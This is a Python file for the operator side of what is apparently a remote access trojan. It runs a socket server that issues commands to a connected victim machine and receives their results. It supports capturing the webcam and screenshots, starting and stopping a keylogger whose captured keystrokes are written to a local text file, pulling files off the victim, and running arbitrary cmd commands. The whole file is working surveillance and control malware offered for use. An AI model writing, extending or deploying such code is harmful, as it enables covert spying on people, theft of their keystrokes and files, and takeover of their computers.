import threading
import socket
import time
 
HEADER = 64
PORT = 4321
SERVER = 'localhost' #socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
connected = True
screenshot_count = 1
filename = ''

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind(ADDR)

def isConnected(conn):
    try:
        #conn.sendall(b'ping')
        #conn.recv(16)
        return True
    except:
        print('[CONNECTION LOST]')
        return False

def handle_client(conn, addr):
    global screenshot_count
    print(f"[NEW CONNECTION] {addr} connected.")
    global connected
    global filename
    connected = True
    incoming_file = False
    filesize = 2048
    i = 1
    while connected:
        try:

            if incoming_file:
                file = open('Files\\'+filename,'wb')
                time.sleep(3)
                file_data = conn.recv(filesize)
                file.write(file_data)
                file.close()
                print('[FILE SAVED]')
                incoming_file = False
            
            else: 
                msg_length = conn.recv(HEADER).decode(FORMAT,errors='ignore')         
                if msg_length:
                    msg_length = int(msg_length)
                    # if msg_length == 0:
                    #     connected = False
                    #     break
                    msg = conn.recv(msg_length).decode(FORMAT)
                    if 'key: ' == msg[:5]:
                        File = open("C:\\Users\\ali_e\\Desktop\\Keylogger.txt","a")
                        File.write(msg[5:])
                        File.close()
                    elif msg[:5] == 'size:':
                        filesize = int(msg[6:])
                        print(str(filesize/1048576)+" MB")
                        incoming_file = True
                    else:    
                        print(f"[{addr}] {msg}")

            if not isConnected(conn):
                connected = False
                break
        except:
            pass

    conn.close()

def send(msg):
    global connected
    try:
        message = msg.encode(FORMAT)
        msg_length = len(message)
        send_length = str(msg_length).encode(FORMAT)
        send_length += b' ' * (HEADER - len(send_length))
        conn.send(send_length)
        conn.send(message)
    except:
        print('[ERROR!]')
        connected = False

def start():
    server.listen()
    print("[LISTENING] Server is listening on {SERVER} ")
    global connected
    while connected:
        global conn
        conn, addr = server.accept()
        handle_client(conn,addr)

def SendMsg():
    try:
        msg = ""
        screenshot_count = 1
        webcam_count = 1
        global connected
        global filename
        while connected:
            msg = input()
            if msg == 'help':
                print('[AVAILABLE COMMANDS]')
                print('     webcam')
                print('     screenshot')
                print('     keylogger start/stop')
                print('     sendfile (file name)')
                print('     exit')
                print('     (cmd commands)')
                continue
            elif msg[:8]=='sendfile':
                filename=msg[9:]
            elif msg [:6] == 'webcam':
                filename = 'webcam '+str(webcam_count)+'.png'
                webcam_count += 1

            elif msg [:10] == 'screenshot':
                filename = 'screenshot '+str(screenshot_count)+'.jpg'
                screenshot_count += 1
                
            elif msg == 'exit':
                send(msg)
                time.sleep(1)
                conn.close()
                connected = False
                break
            send(msg)
    
    except:
        pass

print("[STARTING] server is starting...") 

incoming = threading.Thread(target=start,args=())
incoming.start()

outgoing = threading.Thread(target=SendMsg,args=())
outgoing.start()
